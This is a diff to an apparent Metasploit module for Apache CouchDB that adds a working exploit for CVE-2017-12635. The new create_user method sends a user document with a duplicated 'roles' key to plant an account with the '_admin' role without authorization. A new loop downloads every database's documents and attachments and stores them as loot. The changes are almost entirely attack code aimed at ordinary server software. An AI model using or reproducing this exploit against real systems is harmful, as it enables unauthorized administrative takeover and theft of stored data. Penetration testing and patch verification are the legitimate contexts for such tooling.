@@ -16,19 +16,28 @@ class MetasploitModule < Msf::Auxiliary
       },
       'References'     =>
         [
-          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API']
+          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API'],
+          ['CVE','2017-12635'],
+          ['URL','https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635'],
+          ['URL','https://justi.cz/security/2017/11/14/couchdb-rce-npm.html']
         ],
-      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],
+      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
+                            'Hendrik Van Belleghem - @hendrikvb'
+                          ],
       'License'        => MSF_LICENSE
     ))
 
     register_options(
       [
-        Opt::RPORT(5984),
         OptString.new('TARGETURI', [true, 'Path to list all the databases', '/_all_dbs']),
         OptBool.new('SERVERINFO', [true, 'Print server info']),
-        OptString.new('HttpUsername', [false, 'The username to login as']),
-        OptString.new('HttpPassword', [false, 'The password to login with'])
+        OptBool.new('CREATEUSER', [true, 'Create Administrative user - ']),
+        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12,"")]),
+        OptString.new('HttpPassword', [true, 'CouchDB Password', 'password']),
+        OptString.new('RPORT', [true, 'CouchDB Port', '5984']),
+        OptString.new('RHOST', [true, 'CouchDB Host', '']),
+        OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])
+
       ])
   end
 
@@ -40,8 +49,8 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         'uri'           => normalize_uri(target_uri.path),
-        'method'        => 'GET',
-        'authorization' => auth
+        'method'        => 'GET'#,
+        #'authorization' => auth
       )
 
       temp = JSON.parse(res.body)
@@ -54,8 +63,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("#{peer} Enumerating Databases...")
       results = JSON.pretty_generate(temp)
       print_good("#{peer} Databases:\n\n#{results}\n")
-
-      path = store_loot(
+       path = store_loot(
         'couchdb.enum',
         'application/json',
         rhost,
@@ -64,8 +72,29 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       print_good("#{peer} File saved in: #{path}")
+      res.get_json_document.each do |db|
+        res = send_request_cgi(
+          'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs?include_docs=true&attachments=true"),
+          'method'=> 'GET',
+          'authorization' => auth
+         )
+         if res.code != 200
+           print_bad("Error retrieving database. Consider providing credentials.")
+           return
+         end
+         temp = JSON.parse(res.body)
+         results = JSON.pretty_generate(temp)
+         path = store_loot(
+           "couchdb.#{db}",
+           "application/json",
+           rhost,
+           results,
+           "CouchDB Databases"
+         )
+         print_good("#{peer} #{db} saved in: #{path}")
+      end
     else
-      print_error("#{peer} Unable to enum, received \"#{res.code}\"")
+       print_error("#{peer} Unable to enum, received \"#{res.code}\"")
     end
   end
 
@@ -99,13 +128,48 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def create_user
+    username = datastore['HttpUsername']
+    password = datastore['HttpPassword']
+    rport = datastore['RPORT']
+    rhost = datastore['RHOST']
+    roles = datastore['ROLES']
+    timeout = datastore['TIMEOUT']
+    uripath = datastore['URIPATH']
+
+    data = "{
+\"type\": \"user\",
+\"name\": \"#{username}\",
+\"roles\": [\"#{roles}\"],
+\"roles\": [],
+\"password\": \"#{password}\"
+}"
+    res = send_request_cgi(
+    { 'uri'    => "http://#{rhost}:#{rport}/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
+      'method' => 'PUT',
+      'ctype'  => 'text/json',
+      'data'   => data,
+    }, timeout)
+
+    if res && res.code == 200
+      print_good("User #{username} created with password #{password}. Connect to http://#{rhost}:#{rport}/_utils/ to login.")
+    else
+      print_error("Change Failed :(")
+    end
+  end
+
   def run
     username = datastore['HttpUsername']
     password = datastore['HttpPassword']
+
     auth = basic_auth(username, password) if username && password
     if datastore['SERVERINFO']
       get_server_info(auth)
     end
+    if datastore['CREATEUSER']
+      create_user
+    end
     get_dbs(auth)
   end
+
 end
